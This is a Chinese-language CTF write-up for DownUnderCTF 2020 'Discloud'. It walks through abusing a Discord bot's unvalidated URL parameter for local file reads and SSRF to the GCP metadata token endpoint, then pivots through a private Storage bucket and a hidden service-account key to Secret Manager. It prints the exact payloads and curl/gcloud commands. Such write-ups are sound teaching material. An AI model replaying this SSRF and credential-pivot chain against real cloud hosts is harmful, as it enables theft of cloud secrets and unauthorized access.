# DownUnderCTF 2020 - Discloud

## 题目简述

题目通过 Discord bot 暴露 `!meme list/get/sign` 三类操作。`get --signed-url` 把用户输入直接交给 discord.js 的文件发送逻辑，既能读取本地路径，也能由 bot 主机请求任意 URL。利用链从 LFI/SSRF 开始，但取得 flag 的决定性部分是 GCP 身份和资源权限跳转：VM metadata token → 私有 Storage bucket → 第二份 service account key → Secret Manager。

## 解题过程

### 读取 bot 源码

下面的参数原本应只接受 GCS signed URL，却没有校验 scheme、host 或路径：

```text
!meme get -su <attacker-controlled value>
```

给出本地相对路径可以读取 Node 项目文件：

```text
!meme get -su package.json
!meme get -su index.js
```

`package.json` 的 start script 说明入口是 `index.js`。入口源码留下了一个高价值注释：

```javascript
// const memeBucketName = "secure-epic-meme"
const memeBucketName = "epic-meme1"
```

这既暴露了私有 bucket 名称，也证明当前 bot 运行在 GCP 并通过默认身份访问 Storage。

### SSRF 到 GCP metadata token

在比赛当时的环境中，旧版 `v1beta1` metadata token 路径不要求 `Metadata-Flavor: Google` 请求头，因此可直接通过 bot 的 URL fetch 访问：

```text
!meme get -su http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

响应包含 VM 默认 service account 的短期 OAuth access token。现代环境是否仍允许该旧行为必须重新验证；这里记录的是题目部署时的前提。

用该 token 调用 Cloud Storage JSON API，枚举源码泄露的私有 bucket：

```bash
curl -H "Authorization: Bearer $VM_TOKEN" \
  "https://storage.googleapis.com/storage/v1/b/secure-epic-meme/o"
```

列表中有 `epic.jpg`。通过对象下载 API取回后，内容并不是图片，而是一段 Base64；解码得到另一份 service account JSON。正文不保留其中的私钥、client ID 等凭据，只记录其身份为 `secret-manager@<PROJECT>.iam.gserviceaccount.com`。

### 切换身份读取 Secret Manager

将恢复出的 key 保存为 `secret.json`，激活该服务账号：

```bash
gcloud auth activate-service-account --key-file secret.json
gcloud secrets list
```

Terraform 配置验证了这个身份同时拥有：

- `roles/secretmanager.viewer`：列出 secret；
- `roles/secretmanager.secretAccessor`：读取 secret version 的内容。

枚举结果中唯一目标为 `big_secret`，读取最新版本：

```bash
gcloud secrets versions access latest --secret big_secret
```

得到：

```text
DUCTF{bot_boi_2_cloud_secrets}
```

仓库中的 meme 图片仅是业务装饰，服务账号 JSON 的图片扩展名也是伪装；其视觉内容不参与判断，因此不保留这些图片副本。

## 方法总结

- 核心技巧：把 bot 的任意文件/URL fetch 转化为 LFI 与 SSRF，再沿 GCP metadata、Storage 和 Secret Manager 完成身份升级。
- 识别信号：应用接受所谓 signed URL 却不验证来源、云主机能访问 metadata、源码暴露未使用的私有资源名，说明应构造 `identity -> action -> resource` 权限图。
- 复用要点：拿到 token 后只做与题目相关的最小资源查询；对象名或扩展名不代表真实内容；云中泄露长期 service account key 的危害通常高于短期 metadata token，因为它可能属于权限完全不同的身份。
